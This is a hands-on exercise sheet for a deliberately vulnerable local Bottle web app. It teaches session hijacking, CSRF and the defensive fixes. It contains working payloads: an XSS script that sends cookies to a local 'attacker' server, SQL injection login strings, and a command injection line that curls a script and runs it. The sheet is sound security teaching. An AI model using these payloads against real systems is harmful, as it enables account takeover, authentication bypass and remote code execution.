# Exercises

All exercises run only in your local environment. The goal is not to memorize attack strings. The goal is to observe which implementation becomes dangerous, why it becomes dangerous, and how to explain the defensive fix.

## Exercise 0: Startup Check

1. Start the web app.

   ```bash
   . .venv/bin/activate
   python app/main.py --reset-db
   ```

2. Open `http://localhost:8086`.
3. Log in with `koide` / `password`.
4. Move from MyPage to BBS and post a comment.

Observation points:

- `app/data.db` is created.
- Data is stored in the `Users` and `Comments` tables.
- Login state is stored in a cookie.

## Exercise 1: Bottle Routing

Open `http://localhost:8086/hello/security` and check how `@get("/hello/<name>")` in `app/main.py` returns HTML.

Questions:

- How does part of the URL become a function argument?
- What does Bottle's `template()` function do?

## Exercise 2: Peewee and SQLite

Inspect SQLite directly.

```bash
sqlite3 app/data.db
.tables
.schema users
.schema comments
select userid, username, password, cookie from users;
select commentid, user_id, comment, datetime from comments;
.quit
```

Questions:

- How do Peewee model definitions map to SQLite table definitions?
- What is the problem with storing passwords in plain text?

## Exercise 3: Session Hijacking

1. Log in as `koide` in a normal browser window.
2. Log in as `alice` in an incognito window or another browser.
3. Open `http://localhost:8086/cookies` in both windows and check `cookie_id`.
4. Copy the value stored in the browser from the `koide` side, paste it into the browser-stored value field on the `alice` side, and save it.
5. Reload `/mypage` on the `alice` side.

Observation points:

- Copying a cookie can reproduce another login state.
- `/cookies` compares the browser-stored value with the value the app uses after signature verification.
- When you enter an internal value such as `user1` or `user2` into the "value used by the app after verification" field, the helper page creates a signed cookie for the exercise.
- In this material, the cookie value itself is signed. Simply typing `user1` as the browser-stored value will not work.

Advanced:

- Remove `secret=COOKIE_SECRET` from `response.set_cookie(..., secret=COOKIE_SECRET)` and `request.get_cookie(..., secret=COOKIE_SECRET)` in `app/main.py`. What changes?
- Explain why predictable session IDs are dangerous.

## Exercise 4: XSS

1. Start the helper server in another terminal.

   ```bash
   . .venv/bin/activate
   python tools/attacker_server.py
   ```

2. Log in to the web app and open BBS.
3. Post this comment.

   ```html
   <script>document.location="http://localhost:8090/?cookie_id="+document.cookie</script>
   ```

4. Open `http://localhost:8090` and check whether a cookie string was recorded.

Observation points:

- `app/views/bbs.tpl` disables HTML escaping with `{{!comment.comment}}`.
- User input is interpreted as HTML.
- The cookie does not have `HttpOnly`, so JavaScript can read it.

Cleanup:

```bash
sqlite3 app/data.db "delete from comments where comment like '<script>%';"
```

## Exercise 5: CSRF

1. Stay logged in to the web app.
2. Start the helper server.
3. In the same browser, open `http://localhost:8090/csrf`.
4. Press the button.
5. Check `http://localhost:8086/bbs`.

Observation points:

- The browser sends cookies even for a POST from another site.
- The BBS form has a fixed `token`, but the server does not validate it.
- A CSRF defense needs an unpredictable token that the server verifies.

## Exercise 6: SQL Injection

Try these values on the login page.

| username | password |
| --- | --- |
| `koide` | `' or 'a'='a` |
| `koide' --` | `anything` |

Check the SQL displayed on the result page.

Questions:

- How are input values concatenated into the SQL string?
- Why is hand-built SQL with `sqlite3` dangerous compared with a safe Peewee query?
- What changes when you use placeholders?

## Exercise 7: Command Injection

1. Log in to the web app.
2. Open `/contact`.
3. Enter any string as the email address.
4. Submit this text as the message.

   ```text
   "; /bin/echo injected > command_injection_result.txt; #
   ```

5. Check whether `command_injection_result.txt` was created in the repository root.

Example using the helper server:

```text
"; curl -s http://localhost:8090/badscript -o downloaded_badscript.py; python3 downloaded_badscript.py; #
```

Observation points:

- `/contact` in `app/main.py` concatenates user input into `os.system()`.
- Email sending should use a mail library, not a shell command.
- If an external command is truly needed, use `subprocess.run([...], shell=False)` with an argument array.

## Exercise 8: Clean Up the UI with Pico.css

Use Pico.css instead of a large UI kit. Pico.css styles semantic HTML with a single stylesheet. The sample is in `examples/pico-css/`.

Add this structure:

```text
app/
|-- static/
|   `-- app.css
`-- views/
    |-- base.tpl
    `-- login.tpl
```

Load Pico.css from `base.tpl`.

```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">
<link rel="stylesheet" href="/static/app.css">
```

Add static file serving to `app/main.py`.

```python
from bottle import static_file

@get("/static/<filepath:path>")
def static_files(filepath):
    return static_file(filepath, root=str(BASE_DIR / "static"))
```

Move the login page into a template.

```python
@get("/login")
def login_form():
    return template("login", error=None)
```

Observation points:

- `label`, `input`, `button`, and `nav` become readable with little code.
- UI improvement and vulnerability mitigation are separate tasks.
- Templates make it easier to review escaping behavior for XSS.

## Exercise 9: Fix the Vulnerabilities

Implement these mitigations one at a time and confirm that the previous attack no longer works.

- Replace the login SQL with placeholders.
- Enable HTML escaping in the BBS display.
- Add `httponly=True` and `samesite="Lax"` to the cookie.
- Generate a CSRF token per session and verify it on POST.
- Remove `os.system()` from `/contact`.
- Store hashed passwords instead of plain-text passwords.

Final report:

- Summarize each vulnerability in a table with "root cause", "observed behavior", and "mitigation".
